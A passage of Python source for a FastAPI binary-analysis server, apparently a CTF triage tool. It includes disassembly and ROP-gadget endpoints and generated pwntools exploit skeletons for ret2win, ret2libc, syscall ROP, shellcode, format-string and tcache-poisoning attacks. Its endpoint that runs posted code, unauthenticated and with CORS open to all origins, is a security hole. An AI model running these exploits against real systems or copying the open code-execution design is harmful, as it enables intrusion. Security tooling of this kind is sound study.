"""FastAPI server application — routes, middleware, and entry point."""

import os
import re
import sys
import logging
import tempfile

from pathlib import Path
from fastapi import FastAPI, HTTPException, UploadFile, File, Form
from fastapi.responses import HTMLResponse, Response
from fastapi.middleware.cors import CORSMiddleware

from triage_web.loader import BinaryLoader
from triage_web.engine import Disassembler, ROPEngine, XRefDB, HAS_CAPSTONE
from triage_web.knowledge import VULN_PATTERNS, MITRE_VULN_MAP, EXPLOIT_TECHNIQUES
from triage_web.config import MNEMONIC_COLORS as MNEMONIC_COLOR_MAP, DEFAULT_MNEMONIC_COLOR, VULN_SEVERITY_COLORS
from triage_web.solvers import generate_solver, execute_solver, get_solver_list
from triage_web.frontend import HTML_PAGE

log = logging.getLogger('triage-web')

# ── FastAPI App ────────────────────────────────────────────────────────
app = FastAPI(title='Triage Web', docs_url=None, redoc_url=None)
app.add_middleware(CORSMiddleware, allow_origins=['*'], allow_methods=['*'], allow_headers=['*'])

# Session state
_current: dict = {
    'loader': None,
    'disasm': None,
    'rop': None,
    'xrefs': None,
    'path': None,
    'filename': None,
}


def _get_loader() -> BinaryLoader:
    if _current['loader'] is None:
        raise HTTPException(400, 'No binary loaded. Load one first.')
    return _current['loader']


def _build_string_map(loader, insns: list) -> dict:
    """Build address→string map from .rodata for addresses used in instructions."""
    secs = loader.get_sections()
    rodata = None
    for s in secs:
        if 'rodata' in s['name'].lower() or 'rdata' in s['name'].lower():
            rodata = s
            break
    if not rodata:
        return {}
    start = rodata['vaddr']
    end = start + rodata['size']
    string_map = {}
    seen = set()
    for insn in insns:
        for tok in insn['op_str'].split(','):
            tok = tok.strip()
            if tok.startswith('0x'):
                try:
                    val = int(tok, 16)
                except ValueError:
                    continue
                if start <= val < end and val not in seen:
                    seen.add(val)
                    data = loader.read_vaddr(val, 64)
                    if data:
                        s = data.split(b'\x00', 1)[0]
                        if s and all(32 <= b < 127 or b in (9, 10, 13) for b in s):
                            string_map[val] = repr(s.decode('ascii', errors='replace'))
    return string_map


def _build_known_calls(loader) -> dict:
    """Build address→name map from imports (PLT) and local functions."""
    known = {}
    for imp in loader.get_imports():
        a = imp.get('address', 0)
        if a:
            known[a] = imp['name']

    # Map .plt entries to .plt.sec stubs — the code calls the stub, not the .plt entry
    secs = loader.get_sections()
    plt_sec = None
    for s in secs:
        if s['name'].strip('.') in ('plt.sec', 'plt'):
            if plt_sec is None:
                plt_sec = s
            else:
                plt_sec = s  # prefer .plt.sec if both exist
                break
    if plt_sec and plt_sec['name'].strip('.') == 'plt.sec':
        plt = next((s for s in secs if s['name'].strip('.') == 'plt'), None)
        if plt:
            ps_base = plt_sec['vaddr']
            p_base = plt['vaddr']
            entry_size = 0x10  # typical for x86-64 PLT
            # PLT layout: [0] = resolver prologue, [1..N] = 0x10 byte entries
            for plt_addr, name in list(known.items()):
                off = plt_addr - p_base
                if 0 < off < plt['size'] and off % entry_size == 0:
                    idx = off // entry_size - 1  # skip resolver at index 0
                    stub_addr = ps_base + idx * entry_size
                    if stub_addr not in known:
                        known[stub_addr] = name

    for name, addr in loader.get_functions():
        known[addr] = name
    return known


# ── Health / Shutdown ─────────────────────────────────────────────────

@app.get('/api/health')
def health():
    from triage_web.loader import HAS_PYELFTOOLS, HAS_PEFILE, HAS_LIEF
    return {'status': 'ok', 'deps': {
        'pyelftools': HAS_PYELFTOOLS,
        'pefile': HAS_PEFILE,
        'capstone': HAS_CAPSTONE,
        'lief': HAS_LIEF,
    }}


@app.post('/api/shutdown')
def api_shutdown():
    import threading, time
    # Give the response 0.15s to flush, then exit cleanly (no traceback)
    threading.Thread(target=lambda: (time.sleep(0.15), os._exit(0)), daemon=True).start()
    return {'status': 'ok', 'message': 'Server shutting down'}


# ── Load ──────────────────────────────────────────────────────────────

@app.post('/api/load')
async def api_load(path: str = Form(''), file: UploadFile = File(None)):
    if _current['loader']:
        _current['loader'].close()
    original_name = None
    if file and file.filename:
        ext = Path(file.filename).suffix
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=ext)
        content = await file.read()
        tmp.write(content)
        tmp.close()
        target = tmp.name
        original_name = file.filename
        # Copy to a predictable path so solver scripts can reference the file
        dest = os.path.join(tempfile.gettempdir(), 'triage_' + file.filename)
        try:
            import shutil
            shutil.copy2(target, dest)
            target = dest
        except Exception:
            pass  # fall back to temp path
    elif path:
        if not os.path.isfile(path):
            raise HTTPException(400, f'File not found: {path}')
        target = path
        original_name = os.path.basename(path)
    else:
        raise HTTPException(400, 'Provide path or upload a file')
    try:
        loader = BinaryLoader(target)
        if not HAS_CAPSTONE:
            raise HTTPException(400, 'capstone is required for analysis')
        disasm = Disassembler(loader.arch, loader.bits)
        rop = ROPEngine(loader)
        xrefs = XRefDB()
        _current.update({
            'loader': loader,
            'disasm': disasm,
            'rop': rop,
            'xrefs': xrefs,
            'path': target,
            'filename': original_name,
        })
        return {'status': 'ok', 'info': loader.get_info(), 'filename': original_name}
    except Exception as e:
        raise HTTPException(500, f'Load failed: {e}')


# ── Info ──────────────────────────────────────────────────────────────

@app.get('/api/info')
def api_info():
    return _get_loader().get_info()


# ── Functions ─────────────────────────────────────────────────────────

@app.get('/api/functions')
def api_functions(search: str = ''):
    loader = _get_loader()
    funcs = loader.get_functions()
    if search:
        funcs = [(n, a) for n, a in funcs if search.lower() in n.lower()]
    return [{'name': n, 'address': hex(a)} for n, a in funcs]


# ── Imports ───────────────────────────────────────────────────────────

@app.get('/api/imports')
def api_imports():
    loader = _get_loader()
    return [
        {
            'name': i['name'],
            'library': i['library'],
            'vuln': list(VULN_PATTERNS.get(i['name'], ()))
            if i['name'] in VULN_PATTERNS
            else None,
        }
        for i in loader.get_imports()
    ]


# ── Exports ───────────────────────────────────────────────────────────

@app.get('/api/exports')
def api_exports():
    return _get_loader().get_exports()


# ── Sections ──────────────────────────────────────────────────────────

@app.get('/api/sections')
def api_sections():
    loader = _get_loader()
    secs = loader.get_sections()
    for s in secs:
        try:
            data = loader.read_vaddr(s['vaddr'], min(s['size'], 4096))
            s['entropy'] = round(loader.compute_entropy(data), 3)
        except Exception:
            s['entropy'] = 0.0
    return secs


# ── Segments ──────────────────────────────────────────────────────────

@app.get('/api/segments')
def api_segments():
    return _get_loader().get_segments()


# ── Strings ───────────────────────────────────────────────────────────

@app.get('/api/strings')
def api_strings(min_len: int = 4, search: str = ''):
    loader = _get_loader()
    strs = loader.get_strings(min_len=min_len)
    if search:
        strs = [s for s in strs if search.lower() in s.lower()]
    cols = ['#ff7b72', '#d29922', '#3fb950', '#58a6ff', '#bc8cff', '#f778ba', '#56d4dd']
    return [{'text': s, 'color': cols[hash(s) % len(cols)], 'len': len(s)} for s in strs[:5000]]


# ── Hex ───────────────────────────────────────────────────────────────

@app.get('/api/hex')
def api_hex(vaddr: str = '0x0', size: int = 256):
    loader = _get_loader()
    addr = int(vaddr, 16)
    data = loader.read_vaddr(addr, size)
    if not data:
        # Address isn't a mapped virtual address (e.g. the default 0x0) —
        # fall back to treating it as a raw file offset so the viewer still
        # shows something useful (the file header, etc.).
        data = loader.read_offset(addr, size)
    if not data:
        return {'rows': [], 'start': addr, 'end': addr}
    rows = []
    for i in range(0, len(data), 16):
        chunk = data[i:i + 16]
        hex_bytes = ' '.join(f'{b:02x}' for b in chunk)
        ascii_str = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
        rows.append({'addr': hex(addr + i), 'hex': hex_bytes, 'ascii': ascii_str})
    return {'rows': rows, 'start': addr, 'end': addr + len(data)}


# ── Disassembly ───────────────────────────────────────────────────────

@app.get('/api/disasm')
def api_disasm(vaddr: str = '0x0', size: int = 256):
    loader = _get_loader()
    disasm = _current.get('disasm')
    if not disasm:
        raise HTTPException(400, 'Disassembler not initialized')
    addr = int(vaddr, 16)
    data = loader.read_vaddr(addr, size)
    if not data:
        return {'insns': [], 'address': addr, 'count': 0}
    insns = disasm.disassemble(data, addr)
    result = []
    for i in insns:
        color = MNEMONIC_COLOR_MAP.get(i['mnemonic'].lower(), DEFAULT_MNEMONIC_COLOR)
        result.append({
            'address': hex(i['address']),
            'mnemonic': i['mnemonic'],
            'op_str': i['op_str'],
            'bytes': i['bytes'],
            'color': color,
        })
    return {'insns': result, 'address': addr, 'count': len(result)}


# ── Disasm: Functions ────────────────────────────────────────────────

@app.get('/api/disasm/functions')
def api_disasm_functions():
    loader = _get_loader()
    disasm = _current.get('disasm')
    if not disasm:
        raise HTTPException(400, 'Disassembler not initialized')

    known_calls = _build_known_calls(loader)
    funcs = loader.get_functions()
    # Binary-wide flag: does this binary import/resolve any known-vulnerable call?
    # (Per-function attribution would require disassembling every function here.)
    binary_has_vuln_calls = any(
        name in VULN_PATTERNS for name in known_calls.values()
    )
    result = []
    for name, addr in funcs:
        # Compute size from next function or section end
        size = 32
        for n2, a2 in funcs:
            if a2 > addr:
                size = min(a2 - addr, 2048)
                break
        result.append({
            'name': name,
            'address': hex(addr),
            'size': size,
            'is_vulnerable': binary_has_vuln_calls,
        })
    return {'functions': result, 'count': len(result)}


@app.get('/api/disasm/function')
def api_disasm_function(vaddr: str = '0x0', size: int = 0):
    loader = _get_loader()
    disasm = _current.get('disasm')
    if not disasm:
        raise HTTPException(400, 'Disassembler not initialized')
    addr = int(vaddr, 16)

    known_calls = _build_known_calls(loader)

    # Auto-size to next function boundary if size not given
    if not size or size < 1:
        next_addr = addr + 256
        for name2, a2 in loader.get_functions():
            if a2 > addr:
                next_addr = min(next_addr, a2)
                break
        size = next_addr - addr

    data = loader.read_vaddr(addr, size)
    if not data:
        return {'insns': [], 'address': hex(addr), 'count': 0}
    analysis = disasm.analyze_function(data, addr, known_calls)
    return analysis


@app.get('/api/disasm/variables')
def api_disasm_variables(vaddr: str = '0x0', size: int = 0):
    loader = _get_loader()
    disasm = _current.get('disasm')
    if not disasm:
        raise HTTPException(400, 'Disassembler not initialized')
    addr = int(vaddr, 16)

    known_calls = _build_known_calls(loader)

    if not size or size < 1:
        next_addr = addr + 256
        for name2, a2 in loader.get_functions():
            if a2 > addr:
                next_addr = min(next_addr, a2)
                break
        size = next_addr - addr

    data = loader.read_vaddr(addr, size)
    if not data:
        return {'stack_vars': [], 'stack_frame': 0}
    analysis = disasm.analyze_function(data, addr, known_calls)
    return {
        'address': hex(addr),
        'stack_frame': analysis['stack_frame'],
        'stack_vars': analysis['stack_vars'],
        'calls': analysis['calls'],
    }


@app.get('/api/disasm/decompile')
def api_disasm_decompile(vaddr: str = '0x0'):
    """GET /api/disasm/decompile?addr=0x...
    Returns pseudo-C decompilation of the function at the given address."""
    loader = _get_loader()
    disasm = _current.get('disasm')
    if not disasm:
        raise HTTPException(400, 'Disassembler not initialized')
    addr = int(vaddr, 16)

    known_calls = _build_known_calls(loader)

    # Auto-size to the *nearest* following function boundary
    nexts = [a2 for _, a2 in loader.get_functions() if a2 > addr]
    next_addr = min(nexts) if nexts else addr + 256
    size = min(next_addr - addr, 8192)

    data = loader.read_vaddr(addr, size)
    if not data:
        return {'code': '// no code at ' + vaddr, 'address': vaddr}

    analysis = disasm.analyze_function(data, addr, known_calls)
    string_map = _build_string_map(loader, analysis.get('insns', []))
    # Resolve the real symbol name for this function (falls back to sub_<addr>)
    func_name = known_calls.get(addr) or next(
        (n for n, a in loader.get_functions() if a == addr), '') or f'sub_{addr:x}'
    pseudo_c = disasm.decompile_function(analysis, known_calls, string_map, func_name)
    return {
        'address': vaddr,
        'code': pseudo_c,
        'func_name': func_name,
        'insn_count': len(analysis.get('insns', [])),
        'stack_frame': analysis.get('stack_frame', 0),
        'var_count': len(analysis.get('stack_vars', [])),
    }


# ── Cross-References ─────────────────────────────────────────────────

@app.get('/api/xrefs')
def api_xrefs(vaddr: str = '0x0'):
    xrefs = _current.get('xrefs')
    if not xrefs:
        raise HTTPException(400, 'XRefs not initialized — load a binary first')
    addr = int(vaddr, 16)
    callers = [{'from': hex(f), 'type': t} for f, t in xrefs.get_callers(addr)]
    callees = [{'to': hex(t), 'type': typ} for t, typ in xrefs.get_callees(addr)]
    return {'address': vaddr, 'callers': callers, 'callees': callees}


@app.post('/api/xrefs/build')
def api_xrefs_build(vaddr: str = '0x0', size: int = 4096):
    loader = _get_loader()
    xrefs = _current.get('xrefs')
    disasm = _current.get('disasm')
    if not xrefs or not disasm:
        raise HTTPException(400, 'XRefs not initialized')
    addr = int(vaddr, 16)
    data = loader.read_vaddr(addr, size)
    if not data:
        return {'count': 0, 'status': 'no data at address'}
    insns = disasm.disassemble(data, addr)
    xrefs.build_from_insns(insns)
    return {'count': len(insns), 'status': 'ok'}


# ── Vulnerabilities ──────────────────────────────────────────────────

@app.get('/api/vulns')
def api_vulns():
    loader = _get_loader()
    vulns = []
    for imp in loader.get_imports():
        if imp['name'] in VULN_PATTERNS:
            sev, desc, fix = VULN_PATTERNS[imp['name']]
            vulns.append({
                'name': imp['name'],
                'address': hex(imp['address']) if imp.get('address') else '',
                'severity': sev,
                'description': desc,
                'fix': fix,
                'exploit_path': MITRE_VULN_MAP.get(imp['name'], {}).get('exploit_path', ''),
                'color': VULN_SEVERITY_COLORS.get(sev, '#8b949e'),
            })
    return sorted(
        vulns,
        key=lambda v: {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}.get(v['severity'], 4),
    )


# ── ROP ───────────────────────────────────────────────────────────────

@app.post('/api/rop/scan')
def api_rop_scan():
    rop = _current.get('rop')
    if not rop:
        raise HTTPException(400, 'ROP engine not initialized')
    rop.scan()
    return rop.get_summary()


@app.get('/api/rop/gadgets')
def api_rop_gadgets(query: str = '', cls: str = ''):
    rop = _current.get('rop')
    if not rop:
        raise HTTPException(400, 'ROP engine not initialized')
    return {'gadgets': rop.search(query=query, semantic_cls=cls), 'total': len(rop.gadgets)}


# ── Protections ──────────────────────────────────────────────────────

@app.get('/api/protections')
def api_protections():
    return _get_loader().protections()


# ── CAPA ──────────────────────────────────────────────────────────────

@app.post('/api/capa')
def api_capa():
    try:
        import capa.main
        import capa.rules
        import capa.rules.cache
        import capa.loader as cloader
        import capa
    except ImportError:
        raise HTTPException(400, 'capa not installed — run: pip install flare-capa')
    import pathlib
    loader = _get_loader()
    capa_root = pathlib.Path(capa.main.get_default_root())
    rules_candidates = [
        capa_root / 'rules',
        capa_root.parent / 'rules',
        capa_root / 'capa' / 'rules',
        pathlib.Path('/usr/share/capa/rules'),
        pathlib.Path('/usr/local/share/capa/rules'),
        pathlib.Path(os.path.expanduser('~/.capa/rules')),
    ]
    rules_dir = None
    for p in rules_candidates:
        if p.is_dir():
            if any(f.suffix == '.yml' for f in p.iterdir()):
                rules_dir = p
                break
            if any(True for _ in p.rglob('*.yml')):
                rules_dir = p
                break
    if not rules_dir:
        raise HTTPException(400, 'CAPA rules not found — run: flare-capa --init')
    try:
        rules = capa.rules.get_rules([rules_dir])
        sigpaths = capa.main.get_default_signatures()
        extractor = cloader.get_extractor(
            pathlib.Path(loader.path), 'auto', 'auto', 'vivisect', sigpaths)
        result = capa.main.find_capabilities(rules, extractor, disable_progress=True)
        caps = result.matches if hasattr(result, 'matches') else result
        items = []
        for rule_name, matches in caps.items():
            ns = ''
            if hasattr(matches, '__iter__') and not isinstance(matches, dict):
                ns = getattr(next(iter(matches), None), 'namespace', '')
            items.append({
                'rule': rule_name,
                'namespace': str(ns) if ns else '',
                'matches': len(matches) if hasattr(matches, '__len__') else 0,
            })
        return {'capabilities': items, 'count': len(items)}
    except Exception as e:
        raise HTTPException(500, f'CAPA analysis failed: {e}')


# ── Solver ────────────────────────────────────────────────────────────

@app.get('/api/solver')
def api_solver(solver_type: str = 'angr_find_flag'):
    loader = _get_loader()
    code = generate_solver(solver_type, loader.path, loader.arch, loader.bits)
    return {'code': code, 'type': solver_type, 'arch': loader.arch, 'bits': loader.bits}


@app.post('/api/solver/execute')
def api_solver_execute(body: dict):
    code = body.get('code', '')
    result = execute_solver(code)
    return result


@app.get('/api/solvers')
def api_solvers():
    return {'solvers': get_solver_list()}


# ── Symbols ───────────────────────────────────────────────────────────

@app.get('/api/symbols')
def api_symbols(search: str = ''):
    loader = _get_loader()
    syms = loader.get_symbols()
    if search:
        syms = [s for s in syms if search.lower() in s['name'].lower()]
    return syms


# ── Crypto ────────────────────────────────────────────────────────────

@app.get('/api/crypto')
def api_crypto():
    loader = _get_loader()
    return [{'name': n, 'offset': hex(o)} for n, o in loader.detect_crypto()]


# ── Packer ────────────────────────────────────────────────────────────

@app.get('/api/packer')
def api_packer():
    return _get_loader().detect_packer()


# ── Entropy ───────────────────────────────────────────────────────────

@app.get('/api/entropy')
def api_entropy():
    loader = _get_loader()
    if loader._entropy_cache is not None:
        return loader._entropy_cache
    raw = bytes(loader._raw)
    block = 256
    blocks = []
    for i in range(0, len(raw), block):
        data = raw[i:i + block]
        blocks.append(round(loader.compute_entropy(data), 3))
    loader._entropy_cache = {'blocks': blocks, 'block_size': block, 'total_bytes': len(raw)}
    return loader._entropy_cache


# ── Memory Map ────────────────────────────────────────────────────────

@app.get('/api/memory-map')
def api_memory_map():
    loader = _get_loader()
    secs = []
    for s in loader.get_sections():
        off = s.get('offset', 0)
        size = s.get('size', 0)
        ent = 0.0
        if off >= 0 and size > 0:
            try:
                data = bytes(loader._raw[off:off + min(size, 4096)])
                ent = round(loader.compute_entropy(data), 3)
            except Exception:
                pass
        secs.append({
            'name': s['name'],
            'vaddr': hex(s['vaddr']),
            'size': s['size'],
            'flags': str(s.get('flags', 0)),
            'type': s.get('type', ''),
            'entropy': ent,
            'offset': s.get('offset', -1),
        })
    segs = []
    for s in loader.get_segments():
        segs.append({
            'type': s['type'],
            'vaddr': hex(s['vaddr']),
            'memsz': s['memsz'],
            'filesz': s['filesz'],
            'flags': s['flags'],
        })
    return {'sections': secs, 'segments': segs}


# ── Vuln Hints (MITRE ATT&CK) ────────────────────────────────────────

CODE_GEN = {
    'gets': 'gets(buf)',
    'fgets': 'fgets(buf, n, stdin)',
    'strcpy': 'strcpy(dst, src)',
    'strcat': 'strcat(dst, src)',
    'scanf': 'scanf("%s", buf)',
    'sprintf': 'sprintf(buf, fmt, ...)',
    'printf': 'printf(user_input)',
    'fprintf': 'fprintf(f, user_input)',
    'snprintf': 'snprintf(buf, n, user_input)',
    'malloc': 'malloc(n)',
    'free': 'free(ptr)',
    'system': 'system(cmd)',
    'execve': 'execve(path, argv, envp)',
    'memcpy': 'memcpy(dst, src, n)',
    'read': 'read(fd, buf, n)',
    'strtol': 'strtol(s, NULL, base)',
}

# Functions that give an unbounded / attacker-sized write into a stack buffer
VULN_BOF = {'gets', 'scanf', 'sprintf', 'vsprintf', 'strcpy', 'strcat', 'read', 'fread', 'fgets'}
# Format-string sinks (dangerous only when the format arg is attacker-controlled)
VULN_FMT = {'printf', 'fprintf', 'sprintf', 'snprintf', 'vprintf', 'vfprintf', 'vsprintf', 'vsnprintf', 'syslog'}
# CTF "win"/backdoor function name heuristics
_WIN_NAME_RE = re.compile(
    r'\b(win|winner|pwn|pwnme|get[_]?flag|print[_]?flag|read[_]?flag|cat[_]?flag|'
    r'give[_]?shell|get[_]?shell|spawn[_]?shell|shell|backdoor|secret|magic|admin|'
    r'debug|success|target|flag|bingo|not_?called|unreachable|hidden)\b', re.I)


def _code_example(imp_name: str) -> str:
    return CODE_GEN.get(imp_name, f'{imp_name}(...)')


# ── Binary-specific fact gathering ───────────────────────────────────

def _find_win_functions(loader) -> list:
    """Functions whose name looks like a CTF win/backdoor, or that themselves
    call system()/execve() or reference /bin/sh."""
    out = []
    for name, addr in loader.get_functions():
        if _WIN_NAME_RE.search(name or ''):
            out.append({'name': name, 'address': hex(addr),
                        'reason': 'name matches CTF win/backdoor pattern'})
    return out


def _find_binsh(loader):
    raw = bytes(loader._raw)
    for needle in (b'/bin/sh\x00', b'/bin/bash\x00', b'sh\x00'):
        off = raw.find(needle)
        if off != -1:
            # Try to turn the file offset back into a vaddr
            for s in loader.get_sections():
                so = s.get('offset', -1)
                if so >= 0 and so <= off < so + s.get('size', 0):
                    return {'string': needle.rstrip(b'\x00').decode(),
                            'vaddr': hex(s['vaddr'] + (off - so)),
                            'offset': hex(off)}
            return {'string': needle.rstrip(b'\x00').decode(), 'vaddr': '',
                    'offset': hex(off)}
    return None


def _scan_gadgets(rop) -> dict:
    """Return {gadget_label: first_address} for a handful of ROP staples."""
    found = {}
    if rop is None:
        return found
    try:
        if not getattr(rop, '_scanned', False):
            rop.scan()
        for label, cls in (('pop rdi; ret', 'pop_rdi'), ('pop rsi; ret', 'pop_rsi'),
                           ('pop rdx; ret', 'pop_rdx'), ('pop rax; ret', 'pop_rax'),
                           ('syscall', 'syscall'), ('leave; ret', 'leave_ret'),
                           ('ret', 'ret'), ('int 0x80', 'int_80')):
            hits = rop.search(semantic_cls=cls)
            if hits:
                found[label] = hits[0]['addr']
    except Exception as e:  # pragma: no cover - defensive
        log.debug('gadget scan failed: %s', e)
    return found


def _overflow_sites(loader, disasm, known_calls, is64: bool) -> list:
    """For each local function that calls an unbounded-input primitive, estimate
    the padding from the vulnerable buffer to the saved return address."""
    sites = []
    funcs = sorted(loader.get_functions(), key=lambda t: t[1])
    word = 8 if is64 else 4
    for idx, (name, addr) in enumerate(funcs):
        end = funcs[idx + 1][1] if idx + 1 < len(funcs) else addr + 512
        size = min(max(end - addr, 16), 4096)
        data = loader.read_vaddr(addr, size)
        if not data:
            continue
        try:
            an = disasm.analyze_function(data, addr, known_calls)
        except Exception:
            continue
        unsafe = sorted({(c.get('name') or '').split('@')[0]
                         for c in an.get('calls', [])} & VULN_BOF)
        if not unsafe:
            continue
        frame = an.get('stack_frame', 0) or 0
        # Prefer the buffer that feeds an input call; fall back to frame size.
        buf_off = 0
        for v in an.get('stack_vars', []):
            ub = {(f or '').split('@')[0] for f in v.get('used_by_funcs', [])}
            if ub & VULN_BOF:
                buf_off = max(buf_off, abs(v.get('offset', 0)))
        est = (buf_off + word) if buf_off else (frame + word)
        sites.append({
            'function': name, 'address': hex(addr),
            'unsafe_calls': unsafe,
            'stack_frame': frame,
            'buffer_offset': buf_off,
            'est_offset_to_ret': est,
            'note': 'estimate — confirm with a De Bruijn / cyclic pattern',
        })
    return sites


def _skeleton(kind: str, ctx: dict) -> str:
    fn = ctx.get('filename') or 'chall'
    off = ctx.get('offset', 'OFFSET')
    if kind == 'ret2win':
        return (
            "from pwn import *\n"
            f"elf = context.binary = ELF('./{fn}')\n"
            "io = process(elf.path)   # or: remote(HOST, PORT)\n"
            f"payload  = b'A' * {off}\n"
            "payload += p64(elf.sym['%s'])   # ret slide if the win fn misaligns the stack\n"
            "io.sendline(payload)\n"
            "io.interactive()\n" % ctx.get('win', 'win'))
    if kind == 'ret2libc':
        return (
            "from pwn import *\n"
            f"elf  = context.binary = ELF('./{fn}')\n"
            "libc = elf.libc            # or ELF('./libc.so.6')\n"
            "io = process(elf.path)\n"
            "rop = ROP(elf)\n"
            f"pad = b'A' * {off}\n"
            "# 1) leak a libc addr (puts@got via puts@plt), return to main\n"
            "rop.raw(rop.find_gadget(['ret']))   # stack align\n"
            "rop.puts(elf.got['puts']); rop.main()\n"
            "io.sendline(pad + rop.chain())\n"
            "leak = u64(io.recvline().strip().ljust(8, b'\\x00'))\n"
            "libc.address = leak - libc.sym['puts']\n"
            "# 2) second overflow: system('/bin/sh')\n"
            "rop2 = ROP(libc)\n"
            "rop2.raw(rop2.find_gadget(['ret']))\n"
            "rop2.system(next(libc.search(b'/bin/sh\\x00')))\n"
            "io.sendline(pad + rop2.chain())\n"
            "io.interactive()\n")
    if kind == 'srop' or kind == 'syscall_rop':
        return (
            "from pwn import *\n"
            f"elf = context.binary = ELF('./{fn}')\n"
            "io = process(elf.path)\n"
            "rop = ROP(elf)\n"
            "binsh = %s   # writable region you control, or an existing /bin/sh\n"
            f"pad = b'A' * {off}\n"
            "rop.raw(rop.rdi.address); rop.raw(binsh)\n"
            "rop.raw(rop.rsi.address); rop.raw(0)\n"
            "rop.raw(rop.rdx.address); rop.raw(0)\n"
            "rop.raw(rop.rax.address); rop.raw(59)   # __NR_execve\n"
            "rop.raw(SYSCALL_GADGET)\n"
            "io.sendline(pad + rop.chain())\n"
            "io.interactive()\n" % ctx.get('binsh', "0x0"))
    if kind == 'shellcode':
        return (
            "from pwn import *\n"
            f"elf = context.binary = ELF('./{fn}')\n"
            "io = process(elf.path)\n"
            "sc = asm(shellcraft.sh())\n"
            f"pad = b'A' * {off}\n"
            "buf = STACK_ADDR   # leak or known; NX is OFF so stack is executable\n"
            "io.sendline(sc.ljust(%s, b'\\x90') + pad[len(sc):] + p64(buf))\n" % off +
            "io.interactive()\n")
    if kind == 'fmt':
        return (
            "from pwn import *\n"
            f"elf = context.binary = ELF('./{fn}')\n"
            "io = process(elf.path)\n"
            "# find your arg offset: send '%p ' * 20 and count to your marker\n"
            "OFF = 6\n"
            "payload = fmtstr_payload(OFF, {elf.got['printf']: elf.plt['system']})\n"
            "io.sendline(payload)\n"
            "io.interactive()\n")
    if kind == 'heap':
        return (
            "from pwn import *\n"
            f"elf = context.binary = ELF('./{fn}')\n"
            "libc = elf.libc\n"
            "io = process(elf.path)\n"
            "# tcache poisoning (glibc < 2.32, no key/mangling):\n"
            "#  1. malloc(A); malloc(B)\n"
            "#  2. free(A); free(B)                 # B->fd = A\n"
            "#  3. edit(B, p64(TARGET))             # tcache->next = TARGET\n"
            "#  4. malloc(sz); malloc(sz) -> TARGET # arbitrary write\n"
            "# common TARGETs: __free_hook (-> system), __malloc_hook, a saved return addr,\n"
            "# a GOT entry (partial RELRO), or the stdout FILE for FSOP.\n")
    return ''


@app.get('/api/vuln-hints')
def api_vuln_hints():
    loader = _get_loader()
    disasm = _current.get('disasm')
    rop = _current.get('rop')
    is64 = loader.bits == 64
    imports = {i['name'] for i in loader.get_imports()}
    imports_by_name = {i['name']: i for i in loader.get_imports()}
    prot = loader.protections()
    nx = 'Enabled' in str(prot.get('NX (No-Execute)', ''))
    pie = 'Enabled' in str(prot.get('PIE (ASLR)', ''))
    canary = 'Enabled' in str(prot.get('Stack Canary', ''))
    relro = 'Full' in str(prot.get('RELRO', ''))
    static = len(loader.get_imports()) == 0

    win_functions = _find_win_functions(loader)
    binsh = _find_binsh(loader)
    gadgets = _scan_gadgets(rop)
    known_calls = _build_known_calls(loader) if disasm else {}
    overflow_sites = _overflow_sites(loader, disasm, known_calls, is64) if disasm else []

    filename = _current.get('filename') or 'chall'
    first_off = overflow_sites[0]['est_offset_to_ret'] if overflow_sites else None

    # ── Per-function detail (imports that are exploitation-relevant) ──
    functions_exploit = []
    for imp_name in sorted(imports):
        if imp_name not in VULN_PATTERNS:
            continue
        if imp_name not in (VULN_BOF | VULN_FMT | {'malloc', 'free', 'system',
                            'execve', 'popen', 'memcpy', 'mprotect', 'realloc',
                            'calloc', 'atoi', 'strtol'}):
            continue
        sev, desc, fix = VULN_PATTERNS[imp_name]
        info = imports_by_name.get(imp_name, {})
        address = info.get('address', None)
        functions_exploit.append({
            'name': imp_name,
            'address': hex(address) if address else '',
            'severity': sev,
            'issue': desc,
            'fix': fix,
            'code': _code_example(imp_name),
            'recipe': MITRE_VULN_MAP.get(imp_name, {}).get('exploit_path', ''),
        })

    # ── Ranked, binary-specific attack paths ────────────────────────
    paths = []

    if overflow_sites or (imports & VULN_BOF):
        off = first_off if first_off is not None else 'OFFSET'
        if win_functions and nx:
            steps = [
                f'Overflow the buffer in {overflow_sites[0]["function"]}() — '
                f'~{off} bytes to the saved return address'
                if overflow_sites else 'Overflow a stack buffer to the saved return address',
                f'Overwrite saved RIP with {win_functions[0]["name"]} @ {win_functions[0]["address"]}',
                'If it crashes inside the win function, add one `ret` gadget for 16-byte stack alignment',
            ]
            if pie:
                steps.append('PIE is ON — the win address is randomized; leak the ELF base '
                             '(or use a partial overwrite of the low bytes of saved RIP)')
            paths.append({
                'name': 'ret2win', 'confidence': 'medium' if (canary or pie) else 'high',
                'why': f'stack overflow primitive + win function `{win_functions[0]["name"]}`'
                       + (' — stack canary present, leak it first' if canary else '')
                       + (' — PIE on, need an ELF leak' if pie else ''),
                'steps': steps,
                'skeleton': _skeleton('ret2win', {'filename': filename, 'offset': off,
                                                  'win': win_functions[0]['name']}),
            })
        if not nx:
            paths.append({
                'name': 'Shellcode injection (NX off)', 'confidence': 'high',
                'why': 'NX is disabled — the stack/bss is executable',
                'steps': ['Place shellcode in the overflowed buffer (or .bss)',
                          'Overwrite saved RIP with the address of your shellcode',
                          'Need a stack leak unless a jmp/call rsp gadget exists'],
                'skeleton': _skeleton('shellcode', {'filename': filename, 'offset': off}),
            })
        if nx and not canary:
            has_syscall_chain = all(k in gadgets for k in ('pop rdi; ret',)) and (
                'syscall' in gadgets or 'int 0x80' in gadgets)
            if 'system' in imports or binsh:
                paths.append({
                    'name': 'ret2system', 'confidence': 'high' if ('system' in imports and binsh) else 'medium',
                    'why': ('system@plt present' if 'system' in imports else 'no system@plt')
                           + (f' + "/bin/sh" @ {binsh["vaddr"] or binsh["offset"]}' if binsh else ' + no /bin/sh string'),
                    'steps': [
                        f'padding = {off}',
                        f'pop rdi; ret @ {gadgets.get("pop rdi; ret", "<find one>")}',
                        f'rdi = &"/bin/sh" ({binsh["vaddr"] if binsh else "write it via read() into .bss"})',
                        'return into system@plt' + ('' if is64 else ' (32-bit: arg goes on the stack, not rdi)'),
                    ],
                    'skeleton': _skeleton('ret2libc', {'filename': filename, 'offset': off}),
                })
            if has_syscall_chain:
                paths.append({
                    'name': 'execve syscall ROP', 'confidence': 'medium',
                    'why': 'pop-gadgets + syscall present — no libc needed',
                    'steps': ['Set rdi=&"/bin/sh", rsi=0, rdx=0, rax=59, then `syscall`',
                              'Write "/bin/sh\\0" into a known writable address first (read@plt into .bss)'],
